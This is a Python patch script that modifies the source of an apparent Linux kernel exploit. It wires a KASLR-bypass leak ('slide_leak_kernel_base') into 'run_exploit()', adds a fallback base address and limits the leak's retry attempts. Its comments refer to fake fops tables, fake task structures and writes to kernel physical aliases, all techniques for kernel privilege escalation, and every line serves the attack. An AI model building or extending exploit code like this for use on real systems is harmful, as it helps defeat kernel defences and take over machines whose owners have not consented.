#!/usr/bin/env python3
# Wire the SLIDE KASLR leak into run_exploit(): the fake fops table and fake
# task fields need real text pointers (CONFIG_RANDOMIZE_BASE=y), and SLIDE is
# the only pre-redirect leak (it targets physical aliases, no text_addr).
p = 'src/core/main.c'
s = open(p).read()

anchor = '''  kaslr_done = 1;

  timer_reset();
  TIMER("exploit start");'''
assert anchor in s, 'run_exploit kaslr anchor not found'
inject = '''  kaslr_done = 1;

  /* SLIDE KASLR leak.  Its PI write targets are all physical aliases
   * (loggers / sysctl_bootid / init_task), so it works before we can reach
   * text_addr().  Needed because RANDOMIZE_BASE=y. */
  if (!env_flag("NO_SLIDE", 0)) {
    if (slide_leak_kernel_base()) {
      pr_success("slide KASLR base=%016llx slide=%016llx\\n",
                 (unsigned long long)kaslr_base,
                 (unsigned long long)kaslr_slide);
    } else {
      pr_warning("slide KASLR leak failed; using compile-time base=%016llx\\n",
                 (unsigned long long)kaslr_base);
      kaslr_base = KIMAGE_TEXT_BASE;
      if (active_offsets->kimage_text_base)
        kaslr_base = active_offsets->kimage_text_base;
      kaslr_done = 1;
    }
  }

  timer_reset();
  TIMER("exploit start");'''
s = s.replace(anchor, inject, 1)
open(p, 'w').write(s)
print('patched main.c (wire slide_leak_kernel_base)')

# bound the slide attempts so a hang doesn't burn the whole run
p = 'src/core/slide.c'
s = open(p).read()
s = s.replace('#define SLIDE_MAX_ATTEMPTS 20', '#define SLIDE_MAX_ATTEMPTS 3', 1)
open(p, 'w').write(s)
print('patched slide.c (SLIDE_MAX_ATTEMPTS=3)')
